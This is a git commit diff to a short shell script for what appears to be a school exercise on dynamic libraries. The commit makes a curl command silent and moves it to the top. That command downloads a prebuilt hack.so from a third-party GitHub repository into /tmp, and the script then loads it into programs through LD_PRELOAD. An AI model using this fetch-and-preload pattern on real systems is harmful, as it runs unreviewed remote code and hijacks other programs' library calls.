be69229742be6f4f48a1fe0b6960336a2d85b5c0
amin ahmed <aminahmed24@gmail.com>
2024-12-13 07:32:01 +0200

    make curl silent and run at first

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
+curl "https://github.com/astrotee/alx-low_level_programming/raw/master/0x18-dynamic_libraries/hack.so" -sL -o /tmp/hack.so
 export LD_PRELOAD="/tmp/hack.so"
-curl "https://github.com/astrotee/alx-low_level_programming/raw/master/0x18-dynamic_libraries/hack.so" -L -o /tmp/hack.so
